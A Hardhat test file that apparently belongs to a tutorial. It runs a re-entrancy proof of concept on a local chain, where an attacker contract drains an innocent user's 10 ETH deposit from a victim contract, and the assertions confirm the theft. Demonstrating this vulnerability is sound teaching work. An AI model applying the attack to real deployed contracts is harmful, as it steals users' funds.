// hardhat testing environment ---  https://hardhat.org/tutorial/testing-contracts

const {ethers} = require('hardhat');
const {BigNumber} = require('ethers');
const {parseEther} = require('ethers/lib/utils');
const {expect} = require('chai');

describe("attack", function() {
    it("Should empty the wallet of the good contract" , async function() {

        // deploying the good contract
        const GoodContract = await ethers.getContractFactory('GoodContract');
        const goodContract = await GoodContract.deploy();
        await  goodContract.deployed();

        //deploying the bad contract
        const BadContract = await ethers.getContractFactory('BadContract');
        const badContract = await BadContract.deploy(goodContract.address);
        await badContract.deployed();

        // Get two addresses, treat one as innocent user and one as attacker
        const [_, innocentAddress, attackerAddress] = await ethers.getSigners();


        // Innocent User deposits 10 ETH into GoodContract
        let tx = await goodContract.connect(innocentAddress).addBalance({value: parseEther('10'), });
        await tx.wait();

        let balanceETH = await ethers.provider.getBalance(goodContract.address);
        expect(balanceETH).to.equal(parseEther('10'));
        console.log("GoodContract balance: ", balanceETH);

        // Attacker calls the `attack` function on BadContract
        // and sends 1 ETH

        tx = await badContract.connect(attackerAddress).attack({value: parseEther('1'), });
        await tx.wait();

        // Balance of the GoodContract's address is now zero
        balanceETH = await ethers.provider.getBalance(goodContract.address);
        expect(balanceETH).to.equal(BigNumber.from('0'));
        console.log("GoodContract balance: ", balanceETH);

        // Balance of BadContract is now 11 ETH (10 ETH stolen + 1 ETH from attacker)
        balanceETH = await ethers.provider.getBalance(badContract.address);
        expect(balanceETH).to.equal(parseEther('11'));
        console.log("BadContract balance: ", balanceETH);
    });
});

/*
1. In this test, we first deploy both GoodContract and BadContract.

2. We then get two signers from Hardhat - the testing account gives us access to 10 accounts which are pre-funded with ETH. 
We treat one as an innocent user, and the other as the attacker.

3. We have the innocent user send 10 ETH to GoodContract. 
Then, the attacker starts the attack by calling attack() on BadContract and sending 1 ETH to it.

After the attack() transaction is finished, we check to see that GoodContract now has 0 ETH left, 
whereas BadContract now has 11 ETH (10 ETH that was stolen, and 1 ETH the attacker deposited).

If all your tests are passing, then you were successfully able to execute the Re-entrancy attack through BadContract on GoodContract.

*/